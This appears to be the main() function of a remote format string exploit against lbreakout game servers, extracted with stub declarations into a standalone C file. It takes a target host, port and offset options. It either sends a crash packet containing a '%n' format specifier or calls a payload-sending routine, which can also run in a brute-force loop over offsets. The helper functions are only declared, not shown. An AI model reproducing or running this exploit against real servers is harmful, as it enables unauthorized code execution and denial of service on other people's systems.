#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 int EOF ; 
 int atoi (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  exit (int /*<<< orphan*/ ) ; 
 int getopt (int,char**,char*) ; 
 int /*<<< orphan*/  getpops (char*,unsigned short) ; 
 int /*<<< orphan*/  optarg ; 
 int /*<<< orphan*/  printe (char*,int) ; 
 int /*<<< orphan*/  printf (char*) ; 
 int pt ; 
 int /*<<< orphan*/  send_packet (char*,unsigned short,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  sendcode (char*,unsigned short,int,int,int) ; 
 scalar_t__ strdup (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  usage (char*) ; 

int main(int argc,char **argv){
 unsigned short port=8000; /* default. */
 unsigned short getpop=0;
 unsigned short brute=0;
 unsigned short crash=0;
 int doffset=0;
 int roffset=0;
 int pops=0;
 int chr=0;
 char *hostname=0;
 while((chr=getopt(argc,argv,"t:h:p:d:r:P:gbc"))!=EOF){
  switch(chr){
   case 't':
    /* change this if more platforms are added. */
    if(atoi(optarg)<0||atoi(optarg)>1)
     usage(argv[0]);
    pt=atoi(optarg);
    break;
   case 'h':
    if(!hostname&&!(hostname=(char *)strdup(optarg)))
     printe("main(): allocating memory failed",1);
    break;
   case 'p':
    port=atoi(optarg);
    break;
   case 'd':
    doffset=(atoi(optarg)*4);
    break;
   case 'r':
    roffset=atoi(optarg);
    break;
   case 'P':
    pops=atoi(optarg);
    break;
   case 'g':
    getpop=1;
    break;
   case 'b':
    brute=1;
    break;
   case 'c':
    crash=1;
    break;
   default:
    usage(argv[0]);
    break;
  }
 }
 if(!hostname)
  usage(argv[0]);
 printf(
 "[*] lbreakout[2-2.5+]: remote format string exploit"
 ".\n[*] by: vade79/v9 v9@fakehalo.deadpig.org (fakeh"
 "alo)\n\n");
 if(getpop){
  getpops(hostname,port);
  exit(0);
 }
 else if(crash){
  /* this can sometimes help to activate the code. */
  printf("[*] sending server crash code.\n");
  /* login(name,pwd) buffer prefix, pwd is ignored. */
  send_packet(hostname,port,"\x00\x00\x00\x00\x00\x00"
  "\x00\x00\x03\x04%n",12,0);
 }
 else{
  if(brute){
   for(doffset=0;doffset<444;doffset+=4)
    sendcode(hostname,port,doffset,roffset,pops);
   printf("[!] brute force failed.\n");
  }
  else
   sendcode(hostname,port,doffset,roffset,pops);
 }
 exit(0);
}